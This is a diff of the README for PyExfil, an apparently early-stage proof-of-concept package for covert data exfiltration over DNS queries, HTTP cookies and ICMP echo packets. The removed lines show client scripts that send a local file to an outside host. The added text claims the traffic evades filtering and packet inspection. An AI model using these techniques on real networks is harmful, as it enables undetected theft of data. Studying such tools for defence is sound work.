@@ -1,71 +1,33 @@
-# Exfiltrator Example
+# PyExfil
 
-Getting a bit more serious now. 
-Still very crude and not really usable but getting more functionality. 
-It now has data exfiltration over ICMP (not tested!) and over HTTP Cookies. 
-Read the open issues on GitHub and come give a hand. A lot more to be done. 
+## Abstract
+This started as a PoC project but has later turned into something a bit more. Currently it's an Alpha-Alpha stage package, not yet tested (and will appriciate any feedbacks and commits) designed to show several techniques of data exfiltration is real world scenarios. Currently here are what the package supports and what is allows is:
 
-It is inspired by some of the features of [Regi](http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance).
+* DNS query.
+* HTTP Cookie.
+* ICMP (8).
 
-## Usage example:
-### HTTP Exfilatration Server:
-    #!/usr/bin/python
-    from exfiltration.http_exfiltration import *
-    def main():
-    	print "Starting a listener: "
-    	listen("127.0.0.1", 80)
-    
-    if __name__ == "__main__":
-    	main()
+Package is still not really usable and will provide multiple issues. Please wait for a more reliable version to come along. 
+The release of Symantec's Regin research was the initiator of this module. It is inspired by some of the features of [Regi](http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance). Go read about it :)
 
-### HTTP Exfiltration Client:
-    #!/usr/bin/python
-    
-    from exfiltration.http_exfiltration import *
-    
-    def main():
-        FILE_TO_EXFIL = "/bin/bash"
-        ADDR = "www.morirt.com"
-    
-        if send_file(ADDR, FILE_TO_EXFIL) == 0:
-            print "File exfiltrated okay."
-        else:
-            print "Damn thing failed."
-    
-    if __name__ == "__main__":
-        main()
-        
-### ICMP Server
-    #!/usr/bin/python
-    
-    from exfiltration.icmp_exfiltration import *
-    
-    def main():
-        ADDR = "127.0.0.1"
-        TMP_PATH = "/tmp/"
-        
-        init_listener(ADDR, TMP_PATH)
-    
-    if __name__ == "__main__":
-        main()
+## Techniques
 
-### ICMP Exfiltrator
-    #!/usr/bin/python
-    
-    from exfiltration.icmp_exfiltration import *
-    
-    def main():
-        FILE_TO_EXFIL = "/bin/bash"
-        ADDR = "www.morirt.com"
-        
-        if send_file(ADDR, FILE_TO_EXFIL) == 0:
-            print "File exfiltrated okay."
-        else:
-            print "Damn thing failed."
-    
-    if __name__ == "__main__":
-        main()
+### DNS
+This will allow establish of a listener on a DNS server to grab incoming DNS queries. It will then harvest them for files exfiltrated by the client. It **does not** yet allow simultaneous connections and transfers. DNS packets will look good to most listeners and *Wireshark* and *tcpdump* (which are the ones that have been tested) will show normal packet and not a 'malformed packet' or anything like that.
+### HTTP Cookie
+Exfiltration of files over HTTP protocol but over the Cookies field. The strong advantage of this is that the cookie field is supposed to be random noise to any listener in the middle and therefore is very difficult to filter. 
+### ICMP
+Uses ICMP 8 packets (echo request) to add a file payload to it. It reimplements ICMP ping requests and some sniffers are known to capture it as malformed packets. Wireshark currently displays it as a normal packet. 
 
+## Future Stuff
+### Version Alpha
+[] Check why HTTP Cookie exfiltration keeps failing CRC checks.
+[] Add NTP exfiltration. (Thanks to barachy for the idea)
+[] Write a proper Documentation.
+[] Fix that poorly written *setup.py*.
 
-
-
+### Version Beta
+[] Enable simultaneous support for all data exfiltration methods. 
+[] Translate module to C Windows.
+[] Translate module to C Linux.
+[] Get a damn logo :)
